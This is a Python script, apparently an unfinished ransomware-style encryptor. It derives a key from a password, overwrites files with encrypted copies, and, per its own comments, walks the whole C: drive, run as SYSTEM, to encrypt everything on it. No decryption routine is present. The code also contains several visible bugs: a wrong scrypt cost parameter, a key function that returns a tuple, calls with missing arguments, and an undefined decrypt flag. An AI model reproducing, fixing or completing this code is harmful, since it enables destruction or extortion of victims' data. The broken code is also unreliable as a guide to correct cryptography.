# install cryptopgrapy library (pip install cryptography)

#!/usr/bin/python3

import pathlib, os, secrets, base64, getpass, argparse
import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

#################################################################
#                   Create functions for encrypting             #
#################################################################
def generate_salt(size=16):
    #Generate salt used by key derivation, 'size' is length to generate
    return secrets.token_bytes(size)

def derive_key(salt, password):
    """Derive key from pword using passed salt"""
    kdf = Scrypt(salt=salt, length=32, n=2*14, r=8, p=1)
    return kdf.derive(password.encode())
    # n - cpu/memory cost parameter
    # r - block size parameter
    # p - parallelization parameter
    # RFC 7914 recommends r=8, p=1, n<2**14 or n<2**20 for sensitive files

def load_salt():
    return open("salt.salt", "rb").read()

def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
    """Generates key from pword and salt
       If load_existing_salt is True, will load salt from a file in dr called salt.salt
       If save_salt is True, will generate new salt and save to salt.salt
    """
    if load_existing_salt:
        salt = load_salt()
    elif save_salt:
        salt = generate_salt(salt_size)
        with open ("salt.salt", "wb") as salt_file:
            salt_file.write(salt)
    # generate key from salt/pword
    derived_key = derive_key(salt, password)
    # encode using base64
    return base64,base64.urlsafe_b64encode(derived_key)
"""Arguments
password - password string to generate key from
salt_size - int indicating salt size to generate
load_existing_salt - bool to indicate if  you load previously generated salt
save_salt - bool to indicate whether to save the generated salt
"""

##################################################################
#                            File Encryption                     #
##################################################################

def encrypt(filename, key):
    f = Fernet(key)
    with open (filename, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)

###############################################################
#                     Folder Encryption                       #
###############################################################

def encrypt_folder(foldername, key):
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[*] Encrypting {child}...")
            encrypt(child, key)
        elif child.is_dir():
            encrypt_folder(child, key)


###############################################################
#                       Encrypt C:\                           #
###############################################################
"""
Iterate through every directory in C: and begin to encrypt.
End result should be everything on the C: drive is encrypted.

Start by finding all directories in C:
multithread each directory as a process

call encrypt_folder() function to loop through each found directory
nest a new function to search for more directories in a directory
for each found directory run encrypt_folder() function

will need to be run as SYSTEM to have access to all folders
"""

# find all directories in C:
def find_all_directories(root_path):
    all_dirs = []
    for dirpath, dirnames, filenames in os.walk(root_path):
        for dirname in dirnames:
            full_path = os.path.join(dirpath, dirname)
            all_dirs.append(full_path)
    return all_dirs

# write found directories to file
def write_directories_to_file(directories, output_file):
    with open(output_file, 'w') as f:
        for directory in directories:
            f.write(f"{directory}\n")
    print(f"[+] Wrote (len{directories}) directories to {output_file}")

# process directories from file
def process_directories_from_file(input_file, key):
    with open(input_file, 'r') as f:
        directories = [line.strip() for line in f.readline()]

    for directory in directories:
        if os.path.exists(directory) and os.path.isdir(directory):
            print(f"[+] Processing directory: {directory}")
            encrypt_folder(directory, key)
        else:
            print(f"[-] Directory not found or accessible: {directory}")

def main():
    dir_list_file = "c_dirs.txt"
    key = generate_key()
     
    print(f"[*] Finding all directories...this might take a while...")
    directories = find_all_directories("C:\\")

    write_directories_to_file(directories, dir_list_file)
    
    print("Beginning to process directories...")
    process_directories_from_file(dir_list_file)
    print("[+] Processing complete")



###############################################################
#                       Ease of use                           #
###############################################################

if __name__ == "__main__":
    parser = argparse.ArgumentParser(descrption="File encryptor script with password")
    parser.add_argument("path", help="Path to encrypt/decrpyt, can be file or folder")
    parser.add_argument("-s", "--salt-size", help="If this is set, a new salt with the passed size is generated", type=int)
    parser.add_argument("-e", "--encrypt", action="store_true", help="Whether to encrypt the file/folder, only -e or -d can be specified")
    args = parser.parse_args()
    if args.encrypt:
        password = getpass.getpass("Enter the password for encryption: ")
    elif args.decrypt:
        password = getpass.getpass("Enter the encryption password: ")
    if args.salt_size:
        key = generate_key(password, salt_size=args.salt_size, save_salt=True)
    else:
        key = generate_key(password, load_existing_salt=True)
    encrypt_ = args.encrypt

 